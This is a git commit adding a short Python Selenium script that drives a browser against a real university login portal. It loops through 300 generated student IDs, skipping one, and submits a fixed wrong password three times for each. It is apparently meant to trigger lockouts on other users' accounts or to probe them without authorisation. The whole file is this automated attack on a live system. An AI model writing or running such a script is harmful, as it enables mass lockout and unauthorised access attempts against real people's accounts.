c3c726b153e4bab2e76e0d8bc3338caaba1d7f8f
MuawizKhan <112005095+MuawizKhan@users.noreply.github.com>
2023-11-30 10:27:42 +0500

    Code files

---
+++ zambeel_login.py
@@ -0,0 +1,23 @@
+from selenium import webdriver
+from getpass import getpass
+
+
+driver = webdriver.Chrome("C:\\Users\\muawi\\OneDrive\\Documents\\Study\\Zambeel\\chromedriver.exe")
+driver.get("https://zambeel.lums.edu.pk/psp/ps/?cmd=login")
+for i in range(0,300):
+    userid = "241000" + str(i)
+    if i == 52:
+        continue
+    for j in range(3):
+
+        userid_textbox = driver.find_element(by="name", value="userid")
+        userid_textbox.send_keys(userid)
+
+        password_textbox = driver.find_element(by="id", value="pwd")
+        password_textbox.send_keys("blaoo")
+
+        login_button = driver.find_element(by="name", value="Submit")
+        login_button.submit()
+
+while(1):
+    pass
